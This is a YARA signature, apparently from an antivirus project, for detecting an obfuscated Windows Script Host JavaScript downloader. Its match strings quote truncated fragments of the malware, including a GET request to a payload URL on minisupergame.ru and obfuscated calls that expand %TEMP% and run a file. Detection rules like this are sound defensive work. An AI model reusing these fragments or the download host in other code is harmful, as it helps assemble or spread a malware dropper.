rule sig_20160428_67e5febed170c6741345945dc69d3c6b {
  meta:
    description = "datamaliciousorder - file 20160428_67e5febed170c6741345945dc69d3c6b.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "ca53d1f7b74675071160bd5c4b8fabde32473a48c3f6d706fa14cd3a4a0d47a2"

  strings:
    $s1  = "function RbhCikHpuNbhErfMwoJvd() {return XcoVxeZnmXvuYutWjsUyi[\"E\"+\"xpandEnvir\"+\"cock\".charAt(1)+\"nmentStrings\"](\"%TE\"" ascii
    $s2  = "var XcoVxeZnmXvuYutWjsUyi = function PnhRdrQotKkxKwyAezZrv() {return GxaNzfPkoSnsJlaSrvKjt[LifRonHlmOdaEorBttGju](\"WScript\"+\"" ascii
    $s3  = "return FmtPlcRkiJkoMogGmuDdo - GlcXvsNbkLftNkcUguCep;};" fullword ascii
    $s4  = "function FahJjuUgwDrkSatXewGiv(FmtPlcRkiJkoMogGmuDdo, GlcXvsNbkLftNkcUguCep){PtsHxcQjpBmtUmqMefMio = PtsHxcQjpBmtUmqMefMio * 1; " ascii
    $s5  = "SeeDyzAqmMbgPpgQpnXpr[QjzEeaRrzImsPxzXmuMrz](\"G\" + \"ET\", \"http://minisupergame.ru/a9osfg\", false);" fullword ascii
    $s6  = "var XcoVxeZnmXvuYutWjsUyi = function PnhRdrQotKkxKwyAezZrv() {return GxaNzfPkoSnsJlaSrvKjt[LifRonHlmOdaEorBttGju](\"WScript\"+\"" ascii
    $s7  = "var GxaNzfPkoSnsJlaSrvKjt = this[\"WScript\"];" fullword ascii
    $s8  = "function RbhCikHpuNbhErfMwoJvd() {return XcoVxeZnmXvuYutWjsUyi[\"E\"+\"xpandEnvir\"+\"cock\".charAt(1)+\"nmentStrings\"](\"%TE\"" ascii
    $s9  = "function FxoTeoYspQmkYubLmmRfw(AftZcaQddVuwZwsMfkBqc){XcoVxeZnmXvuYutWjsUyi[(\"Cunt\", \"anal\", \"R\")+ \"u\" + (\"fuck\", \"n" ascii
    $s10 = "function FxoTeoYspQmkYubLmmRfw(AftZcaQddVuwZwsMfkBqc){XcoVxeZnmXvuYutWjsUyi[(\"Cunt\", \"anal\", \"R\")+ \"u\" + (\"fuck\", \"n" ascii
    $s11 = "function FahJjuUgwDrkSatXewGiv(FmtPlcRkiJkoMogGmuDdo, GlcXvsNbkLftNkcUguCep){PtsHxcQjpBmtUmqMefMio = PtsHxcQjpBmtUmqMefMio * 1; " ascii
    $s12 = "function AypPrmIaiMqlNrmZojNcr(){return KtqBtgXscJphBveSpcMcv + \"\";};" fullword ascii
    $s13 = "if (SeeDyzAqmMbgPpgQpnXpr[\"r\"+\"eadystate\"] < 2 * 2) continue;" fullword ascii
    $s14 = "function YbjXuwKxaYyiWriBpfFne() {return ((FhnVzhIzbSwmSloLsgLlc == true) && (FhnVzhIzbSwmSloLsgLlc == ExyWrjYnxOijCioZxjHal)) ?" ascii
    $s15 = "function YbjXuwKxaYyiWriBpfFne() {return ((FhnVzhIzbSwmSloLsgLlc == true) && (FhnVzhIzbSwmSloLsgLlc == ExyWrjYnxOijCioZxjHal)) ?" ascii
    $s16 = "var FhnVzhIzbSwmSloLsgLlc = false;" fullword ascii
    $s17 = "function MfeOuyCybCgpJarXxrLnm(){return LifRonHlmOdaEorBttGju;};" fullword ascii
    $s18 = "var ExyWrjYnxOijCioZxjHal = false;" fullword ascii
    $s19 = "function IziNukXklCduSzmWfmNme(){return 23;};" fullword ascii
    $s20 = "return FahJjuUgwDrkSatXewGiv(1 == 1 ? WofQnhEhbHgrUmhMusGba : 0, 1 == 1 ? KxgSiaUsyBeiEnnTmwZgj : 0);" fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}